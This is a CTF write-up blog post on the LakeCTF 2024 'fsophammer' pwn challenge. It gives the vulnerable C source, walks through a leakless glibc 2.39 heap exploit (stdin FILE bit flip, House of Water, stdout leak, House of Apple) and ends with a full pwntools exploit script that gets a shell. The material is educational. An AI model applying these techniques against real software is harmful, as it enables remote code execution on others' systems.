@@ -1,0 +1,707 @@
+---
+title: LakeCTF 2024 - fsophammer
+date: 2026-01-29
+category: writeups
+excerpt: Upsolve from my BackLog TM
+tags:
+  - pwn
+  - heap
+---
+
+import Challenge from "@components/Challenge.vue";
+
+
+After finally being posted out of camp (no more stay-in!!!), I dug through my
+old CTF archives to find some fun challs to do. This is one of the cooler challs
+that I haven't had the time to sit down and properly look at in a while.
+
+<Challenge
+  title="fsophammer"
+  flag="EPFL{unfortunately_i_dont_have_the_flag}"
+  files={[
+    { name: "fsophammer.zip", url: "https://github.com/samuzora/filedump/releases/download/lake24-fsophammer/fsophammer.zip" }
+  ]}
+>
+Unfortunately I don't have the desc
+</Challenge>
+
+# Analysis
+
+This is the provided source code.
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define N_ENTRIES 4
+#define MAX_SZ 0x3000
+
+const char banner[] = "\n\n"
+"  _________.____       _____      _____            .____   ._.   ____.\n"
+" /   _____/|    |     /  _  \\    /     \\           |   _|  | |  |_   |\n"
+" \\_____  \\ |    |    /  /_\\  \\  /  \\ /  \\          |  |    |_|    |  |\n"
+" /        \\|    |___/    |    \\/    Y    \\         |  |    |-|    |  |\n"
+"/_______  /|_______ \\____|__  /\\____|__  /         |  |_   | |   _|  |\n"
+"        \\/         \\/       \\/         \\/          |____|  |_|  |____|\n"
+"    ______________ ______________                          ._.        \n"
+"    \\__    ___/   |   \\_   _____/                          | |        \n"
+"      |    | /    ~    \\    __)_                           |_|        \n"
+"      |    | \\    Y    /        \\                          |-|        \n"
+"      |____|  \\___|_  /_______  /                          | |        \n"
+"                    \\/        \\/                           |_|        \n\n";
+char* entries [N_ENTRIES];
+int slammed = 0;
+
+void init_setup(void) __attribute__ ((constructor));
+void alloc();
+void free();
+void slam();
+
+void init_setup() {
+  setbuf(stdout,NULL);
+  setbuf(stderr,NULL);
+}
+
+int get_num(const char* prompt, size_t* num, size_t bound) {
+  printf("%s> ", prompt);
+  int scanned = scanf("%zu",num);
+  getchar();
+  if((scanned != 1) || (bound && *num >= bound)) {
+    puts("[-] getnum");
+    return -1;
+  }
+  return 0;
+}
+
+void get_str(char* buf, size_t cap) {
+  char c;
+  printf("content> ");
+  // I'm so nice that you won't have to deal with null bytes
+  for (int i = 0 ; i < cap ; ++i) {
+    int scanned = scanf("%c",&c);
+    if (scanned != 1 || c=='\n') {
+      return;
+    }
+    buf[i] = c;
+  }
+}
+
+void alloc() {
+  size_t idx;
+  size_t sz;
+  if(get_num("index",&idx,N_ENTRIES)) {
+    return;
+  }
+  if(get_num("size",&sz,MAX_SZ)) {
+    return;
+  }
+  entries[idx] = malloc(sz);
+  get_str(entries[idx],sz);
+  printf("alloc at index: %zu\n", idx);
+}
+
+void free_() {
+  size_t idx;
+  if(get_num("index",&idx,N_ENTRIES)) {
+    return;
+  }
+  if(!entries[idx]) {
+    return;
+  }
+  free(entries[idx]);
+  entries[idx] = NULL;
+}
+
+
+void slam() {
+  size_t idx;
+  size_t pos;
+  puts("is this rowhammer? is this a cosmic ray?");
+  puts("whatever, that's all you'll get!");
+  if (get_num("index",&idx,sizeof(*stdin))) {
+    return;
+  }
+
+  if (idx < 64) {
+    puts("[-] invalid index");
+    return;
+  }
+
+  if (get_num("pos",&pos,8)) {
+    return;
+  }
+  unsigned char byte = ((char*)stdin)[idx];
+  unsigned char mask = ((1<<8)-1) & ~(1<<pos);
+  byte = (byte & mask) | (~byte & (~mask));
+  ((char*)stdin)[idx] = byte;
+}
+
+void menu() {
+  puts("1. alloc\n2. free\n3. slam");
+  size_t cmd;
+
+  if (get_num("cmd",&cmd, 0)) {
+    return;
+  }
+
+  switch(cmd) {
+    case 1:
+      alloc();
+      break;
+    case 2:
+      free_();
+      break;
+    case 3:
+      if (!slammed) {
+        slam();
+        slammed = 1;
+      } else {
+        puts("[-] slammed already");
+      }
+      break;
+    default:
+      puts("[-] invalid cmd");
+      break;
+  }
+}
+
+int main() {
+  puts(banner);
+  while(1) {
+    menu();
+  }
+  return 0;
+}
+```
+
+The primitive we're given is simple: we can flip 1 bit in the stdin FILE struct,
+at byte offset 64 or later. The overwrite is only allowed at byte 64, which
+according to the file structure, only allows us to write to `_IO_buf_end{:c}`.
+Nevertheless, this will quite clearly give us some form of overwrite when we
+input stuff into the now-extended buffer.
+
+The heap functionality is quite simple too - we only have an alloc and a free.
+We can hold a maximum of 4 chunks at a time, but there is no restriction against
+discarding a current chunk and allocating a new one without freeing the first
+chunk. The maximum size of a chunk is 0x3000. Since we have no read function,
+we'll need to put some work into getting a leakless exploit to work without
+having to refer.
+
+# Exploit
+
+## Buffer overflow? ezpz!
+
+What can we do with the overflow on stdin's buffer? Because buffering was not
+disabled on stdin, when we send input via stdin, our input will be buffered in a
+chunk stored on the heap. The FILE object keeps track of its buffer with the 2
+pointers, `_IO_buf_base{:c}`  and `_IO_buf_end{:c}`. Since we can flip
+a bit in `_IO_buf_end{:c}`, we can make it point to somewhere way past the end
+of the heap, thus giving us arbitrary write over basically all the chunks in the
+heap. While the heap base is randomized due to PIE, we can ensure that this
+write never fails by writing to one of the higher bytes.
+
+For example, changing the below values (on the left) to the ones on the right
+will always result in a successful setup.
+
+
+```
+0x5579a2ff22a0 -> 0x7579a2ff32a0
+0x556c939152a0 -> 0x756c939152a0
+```
+
+It doesn't matter that the address is invalid, as long as it's larger than
+`IO_buf_base{:c}`, we can trigger the overflow safely without aborting.
+
+It's also helpful for us that the `get_str{:c}` function doesn't append a null
+byte. This means that we can do partial overwrites on some of our pointers
+without needing a leak. We can also edit the `size{:c}` and `prev_size{:c}` of
+chunks before freeing, since we don't need a leak for that.
+
+## Testing our overflow write
+
+After attacking the stdin struct, let's test out our primitive. We will simply
+input 0x10000 a's into stdin. As illustrated below, the buffer overflow indeed
+works, allowing us to edit the size of the top chunk.
+
+```ansi
+[22;1;32mpwndbg> [22;39mheap
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555555b000
+[39mSize: 0x290 (with flag bits: 0x291)
+
+[33mAllocated chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555555b290
+[39mSize: 0x1010 (with flag bits: 0x1011)
+
+[31mTop chunk[39m | [33mPREV_INUSE
+[39mAddr: [34m0x55555555c2a0
+[39mSize: 0x6161616161616160 (with flag bits: 0x6161616161616161)[m
+```
+
+## Choosing a target
+
+Without a leak, we can't place any pointers or mangled pointers in our desired
+locations. We can only depend on the unsorted bin pointer to pivot to libc and
+attack stdout, giving us our leak. On the remote's libc version v2.39, the only
+3 places in the heap where non-mangled pointers are used are `fd`/`bk`,
+`fd_nextsize`/`bk_nextsize`, and the `tcache_perthread_struct{:c}`. So, it makes
+sense for us to attempt to backwards consolidate an unsorted bin chunk into a
+fake chunk on `tcache_perthread_struct{:c}`. This will immediately give us a
+tcache chunk in the libc region.
+
+For backwards consolidation to occur, we need to pass these checks:
+
+1. Our fake chunk must exist at `victim->prev_size{:c}` bytes before victim in
+   memory
+2. Our fake chunk must have `fake->size{:c}` equal to `victim->prev_size{:c}`
+3. **Our fake chunk must have `fake->fd->bk == fake{:c}` and `fake->bk->fd ==
+   fake{:c}`**
+
+(3) is the most difficult to achieve. Thankfully, this exploit is not novel -
+familiar readers will identify it as House of Water. 
+
+## House of Water
+
+In this House, we exploit the memory representation of the
+`tcache_perthread_struct{:c}` to create a fake chunk for backwards consolidate,
+with no leaks required. The general idea is that the tcache counters (which keep
+track of how many chunks there are in each tcache bin) and the head of each bin
+(pointing to the most recently freed chunk) are contiguous in memory. More
+specifically, it looks like this:
+
+```ansi
+[22;1;32mpwndbg> [22;39mx/22gx 0x55555555b000
+[34m0x55555555b000[39m:	0x0000000000000000	0x0000000000000291
+[34m0x55555555b010[39m:	0x0000000000010001	0x0000000000000000 <-- 0x20 and 0x30 have 1 chunk each
+[34m0x55555555b020[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b030[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b040[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b050[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b060[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b070[39m:	0x0000000000000000	0x0000000000000000
+[34m0x55555555b080[39m:	0x0000000000000000	0x0000000000010001 <-- 0x3e0 and 0x3f0 have 1 chunk each
+[34m0x55555555b0a0[39m:	...
+```
+
+At address 0x55555555b080, we see what closely resembles a free chunk in memory.
+This is the key to executing the leakless backwards consolidate - we will use
+the unmangled heads of 0x20 and 0x30 bins to fake an unsorted chunk. Now, we
+just need to make sure that 0x000055555555c2a0 (the 0x20 chunk) has the value
+0x55555555b080 at +0x18 (corresponding to bk), and 0x000055555555c2c0 (the 0x30
+chunk) has the value 0x55555555b080 at +0x10 (corresponding to fd). This allows
+us to pass check (2).
+
+Lastly, for check (1), it's trivial to setup. We just need to make sure our
+victim chunk is exactly 0x10000 bytes away from the fake chunk, ie. at
+0x55555555c080.
+
+## Some grooming
+
+However, there's a few things we want to be careful about. Because of the nature
+of our overflow starting at stdin's buffer, we cannot easily overwrite values
+between chunks. As such, all our overwrites must be done as near to the stdin
+buffer as possible. To facilitate this, we can allocate a large chunk of size
+0x2800, directly adjacent to the stdin buffer. This playground chunk will be
+placed in unsorted bin once we're ready to perform the necessary overwrites.
+Below this chunk is a bunch of padding chunks, followed by the victim chunk we
+wish to overwrite. Refer to the below diagram for a crude illustration of the
+heap layout at this point.
+
+```
+┌────────────────────────────────┐
+│                          0x291 │ tcache_perthread_struct  
+│                                │
+│                                │
+│                                │
+│                                │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x1001 │ stdin buffer
+│                                │
+│ 0x6161616161616161             │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x2801 │ playground
+│                                │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x2001 │ padding
+│                                │
+└────────────────────────────────┘
+         more padding ...
+┌────────────────────────────────┐
+│                          0x5d1 │ padding
+│                                │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                          0x411 │ victim
+│                                │
+└────────────────────────────────┘
+(any additional chunks will go below here)
+```                                                             
+
+## Victim `prev_size{:c}`
+
+Because of a lack of chunks (we can only hold 4 chunks at a time), we need to be
+prudent about our chunk usage. Fortunately, the tcache is very useful for
+storing chunks that we don't need right now, as we can only reclaim it by
+requesting a chunk of the exact size. One such chunk is victim - we only need it
+later when we're done setting up the fake chunk in
+`tcache_perthread_struct{:c}`, which is exactly what we're gonna do now.
+
+We need to create the fake size 0x10001 and the fake fd and bk ptr. Fake size is
+easy, we will allocate and free a 0x3e0 and 0x3f0 chunk each.
+
+After this, we'll be placing the victim chunks we're interested in in the
+playground, so we can go ahead and overwrite victim. Note that because we needed
+to place victim in the tcache so we have more chunks to play around with, victim
+will not be able to consolidate without us modifying the size to something
+bigger. Therefore, we modify it to 0x7f0. When allocated, `malloc{:c}` won't check the
+size of the tcache chunk, so that's all good. When it's subsequently freed,
+`free{:c}` will see that the size is an unsorted bin size and hence trigger the
+consolidate logic. In our overflow, we should also be careful to overwrite the
+sizes of the chunks in between carefully, especially for the playground chunk.
+
+```
+┌────────────────────────────────┐
+│                          0x291 │ tcache_perthread_struct
+│                                │
+│                                │
+│                        0x10001 │ ◄────── fake chunk     
+│                                │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x1001 │ stdin buffer
+│                                │
+│ 0x6161616161616161             │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x2801 │ playground
+│                                │
+└────────────────────────────────┘
+            padding ...
+┌────────────────────────────────┐                       ▲
+│ 0x10000                  0x7f0 │ victim                │
+│                                │                       │
+└────────────────────────────────┘                       │ modified range of victim
+┌────────────────────────────────┐                       │
+│                          0x3e1 │ 0x3e0 (tcache)        │
+│                                │                       │
+└────────────────────────────────┘                       ▼
+┌────────────────────────────────┐
+│                          0x3f1 │ 0x3f0 (tcache)
+│                                │
+└────────────────────────────────┘
+```
+
+## Fake fd and bk
+
+Victim is now ready to consolidate. The last part we're missing is the fd and bk
+pointers. We've noticed that the pointer in `tcache_perthread_struct{:c}` is
+actually not a pointer to the chunk, but a pointer to the contents of the chunk,
+ie. tcache stores +0x10 of the actual chunk address. Why tcache does it like
+this I'm not sure, but it means that the fake chunk address has to be found at
++0x20 and +0x28 of the respective chunks, such that the unlink will succeed.
+This can either be achieved with good feng shui using unsorted chunks, or it can
+be done with largebin's `fd_nextsize{:c}` and `bk_nextsize{:c}`. For those
+unfamiliar with largebin chunks, in addition to the `fd{:c}` and `bk{:c}`
+pointers, which work the same way as , there is also `fd_nextsize{:c}` and
+`bk_nextsize{:c}` which maintains a doubly-linked list with the next
+bigger-sized chunk in the same bin. These pointers always contain heap addresses
+and not libc, as the circular-linked list is maintained by pointing tail to head
+and vice versa, instead of using the `main_arena{:c}`. This is only for
+`fd_nextsize{:c}` and `bk_nextsize{:c}`, as the regular `fd{:c}` and `bk{:c}`
+still operate the same as in unsorted (but each size range of largebin will
+maintain its own linked list).
+
+Anyway, the point is that we can use largebin to place unmangled heap addresses
+in the heap region. These pointers appear at +0x20 and +0x28 of the start of the
+chunk, which as explained earlier is desirable for our fake chunk's `fd` and
+`bk` due to the way a pointer is placed in `tcache_perthread_struct`.
+
+Our plan is thus to place a few largebin chunks in memory, then allocate and
+free them for tcache 0x20 and 0x30. During allocation, we will also partial
+overwrite the `fd_nextsize{:c}` or `bk_nextsize{:c}` pointer, making it point to
+our fake chunk. Unfortunately, because of the size of the stdin buffer, we have
+to do a 8-bit bruteforce here, as the 2nd least significant byte has to be
+reduced.
+
+Below is the way we place the chunks on the heap as needed.
+
+```py
+# setup large chunks for house of water
+alloc(0, 0x410, b"asdf")
+alloc(3, 0x10, b"asdf")
+alloc(1, 0x430, b"asdf")
+alloc(3, 0x10, b"asdf")
+alloc(2, 0x420, b"asdf")
+alloc(3, 0x10, b"asdf")
+free(0)
+free(1)
+free(2)
+
+# trigger unservicable unsorted so chunks go into largebin and obtain the fd_nextsize pointer
+alloc(3, 0x500, b"asdf")
+```
+
+After the above is complete, this is the shape of our heap:
+
+```
+┌────────────────────────────────┐
+│                          0x291 │ tcache_perthread_struct
+│                                │
+│                                │
+│                        0x10001 │ ◄────── fake chunk     
+│                                │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x1001 │ stdin buffer
+│                                │
+│ 0x6161616161616161             │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                          0x421 │ 0x420 (largebins)
+│ 0x7fffff403f10  0x55555555cb40 │
+│ 0x55555555cb40  0x55555555cb40 │ (points to 0x430)
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                           0x21 │ guard
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                          0x441 │ 0x440 (largebins)
+│ 0x7fffff403f20  0x7fffff403f20 │
+│ 0x55555555c6e0  0x55555555c6e0 │ (points to 0x440, self)
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                           0x21 │ guard
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                          0x431 │ 0x430 (largebins)
+│ 0x55555555c2a0  0x7fffff403f10 │
+│ 0x55555555c2a0  0x55555555c2a0 │ (points to 0x420)
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                           0x21 │ guard
+└────────────────────────────────┘
+```
+
+Now we can reclaim the chunks into the 0x20 and 0x30 tcaches respectively. 0x20
+must have +0x28 set to point to the fake chunk, while 0x30 must have +0x20 set
+likewise. Observant readers may find this strange - how can 0x20 contain the
+pointer at +0x28? The answer is unfortunate: we must first allocate a 0x30 chunk
+and afterwards use the stdin overflow to overwrite its size back to 0x20 before
+freeing it. As for the partial overwrite, we will overwrite the last 2 bytes to
+point to the fake chunk.
+
+```
+┌────────────────────────────────┐
+│                          0x291 │ tcache_perthread_struct
+│                                │
+│                                │
+│                        0x10001 │ ◄────── fake chunk     
+│ 0x55555555c2b0  0x55555555cb50 │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                         0x1001 │ stdin buffer
+│                                │
+│ 0x6161616161616161             │
+└────────────────────────────────┘
+┌────────────────────────────────┐
+│                          0x421 │ 0x420 (largebins)
+│ 0x000000000000  0x000000000000 │ ◄──────────────── 0x55555555c2b0
+│ 0x000000000000  0x55555555b080 │ (points to 0x430)
+└────────────────────────────────┘
+                ...
+┌────────────────────────────────┐
+│                          0x431 │ 0x430 (largebins)
+│ 0x000000000000  0x000000000000 │ ◄──────────────── 0x55555555cb50 
+│ 0x55555555b080  0x55555555b080 │ (points to 0x420)
+└────────────────────────────────┘
+           padding ...
+┌────────────────────────────────┐
+│ 0x10000                  0x7f0 │ victim
+│                                │
+└────────────────────────────────┘
+```
+
+
+## Pivoting to libc region
+
+Finally, our heap is ready for the backwards consolidate! On freeing victim, it
+will scan backwards for the fake chunk, "unlink" it from the fake
+doubly-linked list, and place an unsorted chunk overlapping with
+`tcache_perthread_struct{:c}`. Thereafter, we can trim the chunk appropriately
+to place the libc pointers at our desired tcache size, and then perform another
+partial overwrite on the libc pointer to get it to point to stdout. We can then
+attack stdout to get our libc leaks, and finally perform House of Apple to get
+RCE!
+
+# Script
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./chal_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+
+context.binary = exe
+context.aslr = True # rmb to check for brute-forcable stuff!!!
+
+if args.LOCAL:
+    p = process([exe.path])
+    if args.GDB:
+        gdb.attach(p)
+        pause()
+else:
+    p = remote("addr", 1337)
+
+# good luck pwning :)
+def alloc(idx, size, content):
+    p.sendlineafter(b"cmd> ", b"1")
+    p.sendlineafter(b"index> ", str(idx).encode())
+    p.sendlineafter(b"size>", str(size).encode())
+    p.sendlineafter(b"content> ", content)
+
+def free(idx):
+    p.sendlineafter(b"cmd> ", b"2")
+    p.sendlineafter(b"index> ", str(idx).encode())
+
+def slam(idx, pos):
+    p.sendlineafter(b"cmd> ", b"3")
+    p.sendlineafter(b"index> ", str(idx).encode())
+    p.sendlineafter(b"pos> ", str(pos).encode())
+
+# enable heap overflow
+slam(69, 5)
+
+# create playground for later
+alloc(3, 0x2800, b"asdf")
+
+# padding and victim
+padding = 0x10000 - 0x3a40
+for i in range(padding // 0x2000):
+    alloc(2, 0x2000 - 0x10, b"asdf")
+alloc(2, padding % 0x2000, b"asdf")
+alloc(2, 0x400, b"victim")
+free(2) # store in tcache temporarily
+alloc(2, 0x3d0, b"asdf")
+free(2) # form the fake chunk
+alloc(2, 0x3e0, b"asdf")
+free(2) # form the fake chunk
+
+# overwrite victim prev_size and size
+payload = b"\x00"*0x1000
+payload += p64(0x0)
+payload += p64(0x2811)
+payload += b"\x00"*0x2800
+for i in range(padding // 0x2000):
+    payload += p64(0x0)
+    payload += p64(0x2001)
+    payload += b"\x00"*0x1ff0
+payload += p64(0x0)
+payload += p64((padding % 0x2000) + 0x1)
+payload += b"\x00"*(padding % 0x2000)
+payload += p64(0x10000)
+payload += p64(0x7f0) # fake size of victim to bypass tcache on next round
+p.sendlineafter(b"cmd> ", payload)
+
+# recreate playground
+free(3)
+
+# setup large chunks for house of water
+alloc(0, 0x410, b"asdf")
+alloc(3, 0x10, b"asdf")
+alloc(1, 0x430, b"asdf")
+alloc(3, 0x10, b"asdf")
+alloc(2, 0x420, b"asdf")
+alloc(3, 0x10, b"asdf")
+free(0)
+free(1)
+free(2)
+
+# trigger unservicable unsorted so chunks go into largebin and obtain the fd_nextsize pointer
+alloc(3, 0x500, b"asdf")
+
+# partial overwrite (0x20, fake fd pointer)
+payload = b"\x00"*0x18
+payload += b"\x80\xb0"
+alloc(0, 0x20, payload)
+
+# change above size to 0x21
+payload = b"\x00"*0x1000
+payload += p64(0x0)
+payload += p64(0x21)
+p.sendlineafter(b"cmd> ", payload)
+free(0)
+
+# fill unsorted
+alloc(3, 0x3c0, b"asdf") # actually 0x3f0, but we don't want to reclaim 0x3f0 and 0x3e0 tcache
+
+# partial overwrite (0x30, fake bk pointer)
+payload = b"\x00"*0x10
+payload += b"\x80\xb0"
+alloc(0, 0x20, payload)
+free(0)
+
+# fill the rest of tcache, unsorted, small, large..
+alloc(2, 0x3c0, b"asdf") # actually 0x400, but we don't want to reclaim 0x3f0 and 0x3e0 tcache
+alloc(2, 0x430, b"asdf")
+alloc(2, 0x1600, b"asdf")
+
+# prepare tcaches for overwriting
+num_tcache = 0x8
+for i in range(num_tcache):
+    alloc(2, 0x110+i*0x80, b"\x45\xc0")
+    free(2)
+
+# reclaim 0x410 chunk from tcache (will be size 0x7f0 when freed, entering unsorted and triggering consolidate)
+alloc(2, 0x400, b"victim")
+free(2) # new unsorted of size 0x107f1
+
+# resize unsorted to place main_arena pointer at respective tcache entries
+# also partial overwrite to point to stdout
+alloc(2, 0x30, b"\xc0\x45")
+for i in range(num_tcache - 1):
+    alloc(2, 0x30, b"\xc0\x45")
+
+payload = flat(
+    0xfbad1887,
+    0x0, 0x0, 0x0,
+)
+payload += b"\x00"
+alloc(2, 0x110, payload)
+
+# libc base
+libc.address = u64(p.recv(8)) - 0x204644
+print(f"{libc.address = :02x}")
+
+# house of apple
+payload = flat({
+    # _IO_file_plus
+    0x00: b"  sh",
+    0x20: 0x0,
+    0x28: 0x1,
+    0x88: libc.sym._IO_stdfile_1_lock,
+    0xa0: libc.sym._IO_2_1_stdout_-0x10,
+    0xc0: 0x0,
+    0xd8: libc.sym._IO_wfile_jumps-0x20,
+ 
+    # _wide_data (shifted to fit in file)
+    0x18 - 0x10: 0x0,
+    0x30 - 0x10: 0x0, # actually redundant - 0x20 is already set
+    0xe0 - 0x10: libc.sym._IO_2_1_stdout_,
+ 
+    # _wide_vtable
+    0x68: libc.sym.system
+}, filler=b"\x00")
+alloc(2, 0x190, payload)
+
+p.interactive()
+```
